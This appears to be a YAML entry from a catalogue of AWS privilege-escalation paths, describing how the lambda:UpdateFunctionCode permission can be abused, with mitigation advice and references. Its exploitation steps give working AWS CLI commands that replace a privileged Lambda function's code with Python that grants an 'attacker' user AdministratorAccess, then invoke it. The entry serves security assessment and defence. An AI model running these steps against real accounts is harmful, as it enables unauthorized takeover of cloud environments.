id: lambda-003
name: lambda:UpdateFunctionCode
category: access-resource
services:
- lambda
description: A principal with `lambda:UpdateFunctionCode` can modify the code of an existing Lambda function that has a privileged
  execution role. By replacing the function code with malicious code, the attacker can execute arbitrary commands with the
  privileges of the function's execution role when the function is invoked. This is particularly effective against functions
  that are automatically triggered by events or regularly invoked.
prerequisites:
  admin:
  - A Lambda function must exist with an administrative execution role (e.g., AdministratorAccess)
  - The function must be invokable either manually or via automatic triggers
  lateral:
  - A Lambda function must exist with a privileged execution role
  - The function must be invokable either manually or via automatic triggers
exploitationSteps:
  awscli:
  - step: 1
    command: |
      echo 'import boto3; iam = boto3.client("iam"); iam.attach_user_policy(UserName="attacker", PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess")' > lambda_function.py
    description: Create malicious Lambda function code that escalates privileges
  - step: 2
    command: zip exploit.zip lambda_function.py
    description: Package the malicious code into a deployment package
  - step: 3
    command: |
      aws lambda update-function-code --function-name TARGET_FUNCTION \
        --zip-file fileb://exploit.zip
    description: Update the target Lambda function with the malicious code
  - step: 4
    command: aws lambda invoke --function-name TARGET_FUNCTION output.txt
    description: Invoke the function to execute the privilege escalation
recommendation: |
  Restrict the `lambda:UpdateFunctionCode` permission using the principle of least privilege.
  Use resource-based policies to limit which functions can be modified:

  ```json
  {
    "Effect": "Allow",
    "Action": "lambda:UpdateFunctionCode",
    "Resource": "arn:aws:lambda:REGION:ACCOUNT_ID:function/SpecificFunction"
  }
  ```

  Additional controls:
  - Monitor CloudTrail for `UpdateFunctionCode` events on sensitive functions
  - Implement Lambda function versioning and aliases to prevent direct modification
  - Use AWS Config rules to detect changes to Lambda function code
  - Require code signing for Lambda deployments
  - Alert on Lambda functions with privileged roles being modified
discoveredBy:
  name: Spencer Gietzen
  organization: Rhino Security Labs
  date: '2019'
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - Lambda Update Function Code
  url: https://github.com/BishopFox/iam-vulnerable
relatedPaths:
- lambda-001
- lambda-002
toolSupport:
  pmapper: true
  iamVulnerable: true
permissions:
  required:
  - permission: lambda:UpdateFunctionCode
    resourceConstraints: Must have permission to update the target Lambda function's code
